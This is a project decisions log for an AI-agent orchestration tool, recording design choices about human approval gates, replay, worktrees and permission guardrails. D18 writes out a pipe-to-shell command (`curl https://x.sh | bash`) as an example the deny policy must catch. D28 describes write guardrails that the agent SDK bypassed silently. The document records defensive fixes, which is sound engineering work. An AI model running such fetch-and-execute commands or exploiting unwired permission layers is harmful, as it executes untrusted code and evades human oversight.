# Decisions

Every §-reference points at `agentflow-architecture.md`. Each decision names
where it is encoded, so reversing one is a code change with a known blast
radius rather than an archaeology exercise.

## The six open decisions from §20

### D1 — Autonomy default: all three gates mandatory

Ships with G1, G2 and G3 all required. No trusted profile, no auto-approve, no
setting that removes a gate. Autonomy gets earned with §16.3 data, not assumed.

*Encoded in:* `GATE_AFTER_STEP` in [machine.ts](packages/core/src/fsm/machine.ts).
A gated step cannot be left without a `human_decided` trigger, and there is no
code path that synthesizes one. W8 additionally refuses a workflow that skips a
gated phase or step while still declaring its gate.

*Reversing it later:* add a per-profile gate set to `PipelineOptions`. The
machine already treats "gate satisfied" as state, so this is additive.

### D2 — Worktree location: sibling directory

`<repo>-agentflow/<TICKET-KEY>`, not `.agentflow/worktrees/`. Build tooling
that resolves paths from the repo root gets confused by nested worktrees, and
the gitignore discipline required by the nested option is a permanent tax.

*Encoded in:* `RunStore.create` in [store.ts](packages/orchestrator/src/runs/store.ts).
Configurable in M1 when real worktrees exist.

### D3 — Tests: local in the loop, CI as pre-ship truth

L0–L3 run locally inside the repair loop, because a 40-second local unit run is
what makes the loop converge. CI is the authority before Gate 3, because CI is
what the merge gate actually runs.

*Encoded in:* originally a `wait_for_ci` phase between `review` and
`human_review`, defaulting to off. **Superseded by D34:** §5.8 makes ship
re-run the full ladder on the rebased tree, which is the pre-ship truth this
decision was reaching for, done locally and without waiting on a remote. The
phase is retired; `WorkflowPipeline.waitForCi` survives as a reserved flag.

The reasoning that carried the phase early — adding one to a machine with a
persisted event log is expensive later — turned out to be right in the general
case and wrong here: the seven-phase condensation had to touch the enum anyway,
so retiring it cost nothing extra.

### D4 — Ticket sizing: reject with a suggested split

A ticket over the estimated-edit budget is rejected at plan validation with a
proposed decomposition, rather than attempted. Auto-splitting into linked
sub-tickets is deferred.

*Encoded in:* rule 7 of `PLAN_VALID` (§5.5) in
[plan.ts](packages/agent-runtime/src/phases/plan.ts).

### D5 — The human's uncommitted work: explicit base ref

Runs branch from `origin/<base>` so local WIP is invisible to the agent, which
is the right default. "Base this run on my current branch" is expressible
rather than a special case: `RepoRef.baseRef` is a first-class field and
`CreateRunParams.baseRef` plumbs it through from the UI.

*Encoded in:* `RepoRef` in [domain.ts](packages/protocol/src/domain.ts).

### D6 — Multi-repo: one repo in v1, not one repo by definition

§20.6 warns that retrofitting is expensive, so the identifiers are
repo-qualified now even though nothing reads them yet:

- `RepoId` exists as a distinct type, and `RepoRef` carries an `id`.
- `Task.repo` is an optional `RepoId` defaulting to the run's single repo.

Adding a second repo becomes an additive schema change rather than a break in
a persisted event log. `Run.repo` stays singular until v2 actually needs it —
speculatively pluralizing it would complicate every call site today to buy
nothing.

## Decisions made while building M0

### D7 — Human gates are evaluated on *exit*, not entry

§5's state diagram gates the transitions *out of* the work that produces the
artifact. So a gated stage is entered normally, does its work, and only then
parks in `waiting_human`. Gating on entry would park the run before the
artifact the human is meant to judge exists.

*Amended by D35:* with the seven-phase vocabulary the gate hangs off a **step**
exit rather than a phase exit — `questions`, `validate_plan`,
`triage_findings`. The principle is unchanged; what moved is the granularity,
because G2 now has work after it inside the same phase.

### D8 — A loop-back clears the gate it invalidates

`MachineState.gatesPassed` is cleared for the relevant gate whenever the run
loops backward: a scope change clears G1, thrash-driven replanning clears G2,
a "request revision" clears its own gate. Without this, a revised plan would
sail past Gate 2 on the strength of an approval given to a different plan —
which is exactly how gates become theatre (§7.1).

### D9 — An illegal transition is an error, never a silent no-op

`transition()` returns `{ok: false, reason}` rather than ignoring a trigger it
does not expect, and the orchestrator writes that reason to the event log. A
swallowed trigger is how a run stalls forever with a spinner and no
explanation.

### D10 — Replay is authoritative; `state.json` is only a cache

`RunStore.restore()` deliberately does not read `state.json`. If replay and the
snapshot ever disagree, replay is right. The snapshot exists to make the first
paint fast, and deleting it must never lose information (§3.3). A property test
asserts `replay(snapshot) ≡ fold(events)` for arbitrary event sequences.

### D11 — A spike keeps all three gates

§5.9 says a spike skips Build and Ship. It is silent on review. The call: a
spike skips the `auto_review` step — there is no diff for an automated code
review to read — but **keeps** the `review` phase, where G3's question becomes
"are these findings good?" rather than "is this code I would merge". This keeps
the three-gate invariant uniform across every profile and gives the spike a
real terminus.

The seven-phase vocabulary expresses this better than the old one did: it is
`skip: [build, ship]` plus `skipSteps: [auto_review]`, which says exactly what
is dropped and exactly what is kept.

### D12 — Questions route through the broker, never straight to the log

An agent asking a question calls the broker, which applies the §7.2 cap and the
`alreadyChecked` requirement and *may refuse*. Only an accepted question is
written to the event log. Logging first would make the cap unenforceable, since
the UI renders from the log.

## Decisions made building M1's foundation

### D13 — A "profile that skips Q&A" keeps its phase and its gate

§5.10 says `chore` and `refactor` skip clarify. Taken literally that drops G1
with it, which collides with D1's three mandatory gates — and W6 caught the
contradiction the first time the built-in workflows were validated.

The resolution: those workflows keep the `questions` step (`clarify` before the
condensation) and set `maxQuestionsPerPhase: 0`. It runs, asks nothing, records
its assumptions, and presents the spec for a fast confirmation. What a chore
skips is the *questions*, not the *gate* — which is what §5.9's parenthetical
"(unless questions are blocking)" was already pointing at.

W8 now enforces this one level down as well: `skipSteps` may not drop a step
whose gate is still required, because gates hang off step exits (D35) and
skipping the step would delete the gate silently.

### D14 — The workflow definition is the only source of pipeline shape

`PipelineOptions` used to be `{profile, waitForCi}` with a `PROFILES` table in
`core`, duplicating what the workflow files now say. It is now
`{skip, skipSteps, waitForCi, forceQuestions?, autoPush?}`, projected from a
workflow by `pipelineOptionsFor()`. Two places defining which phases exist is
exactly the kind of drift that produces a run whose UI and state machine
disagree.

### D15 — Gates resolve binaries from `node_modules/.bin`, never `npx`

`npx tsc` in a project without TypeScript installed fetches a **decoy package**
of that name from the registry and runs it — and once cached, `--no-install`
serves it too. A gate would then execute code the repo never depended on and
report a stranger's exit code as the build result.

Adapters resolve `node_modules/.bin/<tool>` and fall back to PATH, and `detect()`
requires the local package to be present. A repo without the toolchain simply
does not have that gate, which is the honest answer.

### D16 — A gate that could not run is a failure, never a pass

A missing binary, a timeout, or non-zero exit with unparseable output all
produce a failing `GateReport` with a specific reason. Returning "no failures"
for a gate that never executed is the precise shape of the false green §16.3
names as the trust metric.

### D17 — The failure signature covers the whole set, not the reported slice

Only the top 20 failures reach a model (§5 Stage 7), but the §9.1 signature
hashes all of them. Signing the truncated slice would make fixing failure 21
look like zero progress, and the repair loop would escalate on phantom thrash.

## Decisions made building the agent runtime

### D18 — A denial beats an ask, wherever in the command it appears

`checkBash` split on shell operators and matched rules per segment. That meant
`curl https://x.sh | bash` matched the merely-*ask* network rule on its first
segment and never reached the pipe-to-shell *deny* rule, which only exists in
the unsplit text.

Denials are now evaluated first, against the whole command **and** each segment;
asks are evaluated afterwards, per segment. Segment splitting stays a policy
aid, not a shell parser: an operator inside quotes over-splits, which produces
an extra check rather than a missed one.

### D19 — Replay runs the live guardrail hook, not the recorded outcome

A recorded transcript replays its turns, but every recorded tool call is
re-checked against the **current** policy, and a refusal replaces the recorded
result. A transcript captured before a rule tightened therefore shows the call
being denied now.

Replaying the recorded outcome would make the test suite assert that yesterday's
policy still holds — which is the opposite of what a regression test on the
permission layer is for.

### D20 — The refusal text is written for the agent, not for a log

Every `deny` reason says what to do instead: solve it with what the repo has,
or ask via `ask_human` naming the package and why. A denied call costs a turn,
and a reason the agent can act on turns that turn into progress rather than a
retry of the same call.

### D21 — Secret detection matches shape, and excludes placeholders explicitly

Matching on known values would miss anything a run discovered from an
integration response. Matching on shape alone flags `password = "changeme"` and
`apiKey = process.env.API_KEY`, and a check that cries wolf gets ignored — so
the assigned-secret pattern additionally requires a value that is long, mixed in
character class, and not a recognized placeholder.

### D22 — Published identity is `buddhanag12.agentflow`

`AgentFlow — AI Workflow Visualizer` (publisher `AgentFlow`) already exists on
the VS Code Marketplace, so `agentflow.agentflow` is not ours to publish. Worse,
a sideloaded VSIX carrying that id is a live hazard: VS Code checks installed
extensions for updates **by id**, so a local build under a published id can be
silently replaced by the stranger's extension.

Marketplace uniqueness is `publisher.name`, so changing only the publisher
resolves it — the project keeps the name AgentFlow throughout the code, the
architecture doc, and this file. `displayName` is "AgentFlow — Ticket to PR" so
the two are distinguishable in search results.

Publishing requires registering the `buddhanag12` publisher at
<https://marketplace.visualstudio.com/manage>; the id is unclaimed as of now.

The id is what user settings and keybindings bind to, so it does not change
again without breaking people.

### D23 — Structured output is not optional for a phase the orchestrator consumes

The first live harvest returned prose and failed its schema check, because
`SessionOptions.outputSchema` was never passed through to the SDK's
`outputFormat`. §6.3 lists structured output as a context-discipline measure,
but it is stronger than that: a phase whose result the orchestrator *parses*
cannot advance without it, so the wiring is load-bearing rather than an
optimization.

Two SDK-specific details that cost a run each to discover: `z.toJSONSchema()`
stamps a `$schema` pointing at draft 2020-12 which the CLI's validator refuses
to resolve, so the provider strips it; and the SDK is ESM-only against these
CommonJS packages, so the runtime import has to stay opaque to TypeScript or it
is downlevelled to `require()` and fails.

### D24 — The spawned agent inherits the developer's Claude Code context

The first successful harvest cited "user memory" in its risk list — it had read
memory files belonging to the developer's own Claude Code session, despite
`settingSources: []`.

That is useful by accident and wrong by design: a run's behaviour would differ
per machine, which breaks the reproducibility the replay model and the eval
harness (§16.3) both depend on. Left as a known issue for now; the fix belongs
with the phase executors, not the provider.

### D25 — Provenance is a quote, and the quote is checked

§5 Stage 2 requires a `source` on every acceptance criterion. A source that is
only a label (`"jira:comment:88231"`) is unfalsifiable — the model can write one
for a requirement it invented.

So `Provenance` carries a verbatim `quote`, and SPEC_VALID rules S1/S2 check that
the quote actually appears in the ticket or the harvest digest, compared with
whitespace and case normalized. The model can still write any statement it likes;
it cannot manufacture the evidence for it. Design references are exempt because
the frame text is not available to compare against yet.

This is the cheapest anti-hallucination measure in the system, and the first live
run produced eleven criteria that all passed it.

### D26 — A task's check says how, not just which gate

§5 Stage 4 requires every task to carry a machine-checkable acceptance
criterion. Naming the gate alone (`"unit"`) is not enough to be falsifiable —
any task can claim the unit gate covers it.

So `TaskCheck` is `{gate, how}` where `how` states concretely what proves it: a
named test case, a grep, a command scope. The live run produced checks like
"`git diff --name-only` lists only packages/orchestrator/src/{...}" and
"grep shows no environment or credential value interpolated into a log record".
Those are verifiable claims; "the unit gate covers this" is not.

This also feeds Appendix A's "tell the agent how it will be judged" — the
implementer receives the exact command that will decide its work.

### D27 — Planning is the expensive phase, and that is the right place to spend

The first full run cost $1.54: harvest $0.15, spec $0.27, plan $1.12. Planning
alone is more than twice the other two combined, because the planner runs on
opus at xhigh effort while harvest runs on sonnet at low.

That is the §15.1 model-routing lever working as intended rather than a problem
to fix. A bad plan is paid for repeatedly in the repair loop; a good one is paid
for once. Revisit only if the ratio moves after the implement phase exists and
the true per-run total is known.

### D28 — Guardrails go in `PreToolUse`, not only `canUseTool`

The first live implement run reported three files written and a `filesTouched`
of `[]`. The cause: `permissionMode: 'acceptEdits'` pre-approves edits inside
the workspace, so the SDK never consults `canUseTool` for them. **Every guardrail
was being bypassed on exactly the calls that write.**

§7.4 already says this — Layer 1 is a `PreToolUse` hook that "runs before every
tool call"; Layer 2 is `canUseTool`, "for calls that fall through policy to a
prompt". Implementing only Layer 2 silently produced a system with no Layer 1.
Both are wired now, and the hook is the binding one.

Worth remembering as a class of bug: a permission layer that is never invoked
looks exactly like a permission layer that always allows.

### D29 — Only a write counts against the touch budget

The same run counted every `Read` against `maxFilesTouched`, so a task that
explored three files before editing had already spent its budget. Reads are how
a task does its job; the budget exists to stop scope creep, which is a property
of writes.

### D30 — A worktree shares `node_modules`, and sharing is not a change

A fresh worktree has no `node_modules`, so every gate in it fails with a
module-resolution error that reads like a code problem and is not — the first
run's implementer correctly reported it could not verify its own work, and was
right. `WorktreeManager` now symlinks shared entries (§12.6) on create, and
excludes them from `changedFiles` so infrastructure never reaches the review
surface as a diff.

### D31 — A driver runs the phase the run is in, it does not advance into it

`RealRunDriver.start()` began with `step({kind:'advance'})`, which moved the run
out of `intake` before intake's work ran. Intake is where the worktree is
created, so harvest then executed with an undefined cwd — against the
developer's own checkout rather than an isolated tree. It was read-only, so
nothing was harmed, but the isolation the whole parallel model depends on was
simply not in effect, and nothing said so.

`start()` now runs the current phase, and `harvest` refuses to run without a
worktree rather than silently falling back to the process's cwd. A phase that
cannot have its isolation must fail, not proceed.

### D32 — Phase transitions chain, they are not dropped

A phase advances by calling `step` from inside its own execution, so the next
phase is always requested while the current one is still in flight. The
in-flight guard originally returned the running promise, which dropped the
request and stalled every run after its first phase. Requests now chain.

### D33 — The real driver is the default; simulation is opt-in

`AGENTFLOW_SIMULATE=1` selects the fake driver. It is what the daemon tests and
UI work use — they must be deterministic and free. Everything else gets the real
phases, because a default that simulates is a default that lies.

## Decisions made condensing the pipeline to seven phases

### D34 — Seven phases, and the finer work becomes a `Step`

Watching a full run walk thirteen phase transitions made the granularity that
reads well in a document read badly on a board. §5.1 replaces it: seven phases
— `intake`, `preflight`, `context`, `plan`, `build`, `review`, `ship` — with a
`Step` for what happens inside one. Seven pills in the UI; steps in the run
detail.

Three things fell out of the condensation rather than being decided separately:

- **`intake` and `harvest` merged**, which is what prompted the exercise:
  harvest is now the first step of `context`.
- **There is no terminal `done` phase.** It was never a stage of work, only a
  marker for a terminal status, and `RunStatus` already carries that. A
  finished run sits at its last phase with `status: 'succeeded'`.
- **`wait_for_ci` is retired**, superseding D3's placement. §5.8 re-runs the
  full ladder on the rebased tree, which is the pre-ship truth D3 wanted,
  obtained locally instead of by waiting on a remote. `waitForCi` remains in
  `WorkflowPipeline` as a reserved flag rather than being deleted from every
  workflow file on disk.

`repair` and `human_review` are steps but are deliberately absent from
`STEP_ORDER`: a trigger enters them — a red gate, a parked gate — never falling
off the end of the previous step. A test asserts exactly those two are
unsequenced, so a third slipping in gets noticed.

Gate count did not change. It was never the problem.

### D35 — The gate hangs off a step exit, not a phase exit

D7 gated phase exits, which was correct while each gated phase had one piece of
work in it. §5.5 breaks that: `decompose` runs **after** G2, inside the same
`plan` phase. A phase-exit gate would compile work packets from a plan no human
had yet approved — precisely the thing G2 exists to prevent.

So `GATE_AFTER_STEP` maps `questions → G1`, `validate_plan → G2`,
`triage_findings → G3`, and `advance` checks the step's gate before walking to
the next step. `human_review` is where a run sits while G3 is held, which is
also what §3.1 calls it.

### D36 — A pre-2.0.0 log is migrated on read, and never rewritten

Narrowing the `Phase` enum was a silent data-loss bug waiting to happen:
`parseLine` drops any line that fails `RunEvent.safeParse`, so every
`phase_entered: 'harvest'` in the six run logs already on disk would have
vanished with no error — and a log that lost half its events looks exactly like
a log that was never written.

`migrateRawEvent` runs before the parse. Ten legacy phase names become
`step_entered` events, which carry strictly *more* information than they did as
phases, since a step implies its phase through `PHASE_OF_STEP`. `done` folds
into `ship`; `wait_for_ci` has no equivalent and is dropped **and counted**, and
the daemon logs the count on restore. Verified against the six real logs: 31
events migrated, 0 dropped, and every line still accounted for.

Migration happens on read only. The log is append-only and is the audit trail
(§3.3) — rewriting history to fit a newer schema would destroy the thing it
exists to preserve.

One bug this surfaced: replaying a migrated log produced `ship/human_review`, a
phase/step pair the machine cannot generate, because a bare `phase_entered` left
the previous phase's step current. `phase_entered` now clears the step.

### D37 — Starting a run is its own trigger

`driver.start()` used to apply `{kind: 'advance'}`, which both marked the run
running and moved it off its first step. With a step vocabulary that means
`classify` never executes, and D31's point — a driver runs the phase the run is
*in*, it does not advance into it — stops holding at the step level too.

`{kind: 'start'}` is legal only from `queued`, keeps phase and step where they
are, and emits `run_step` for the step the run is already on. It also gets the
`status_changed` transition into the log, which `advance` was producing as a
side effect of something else.
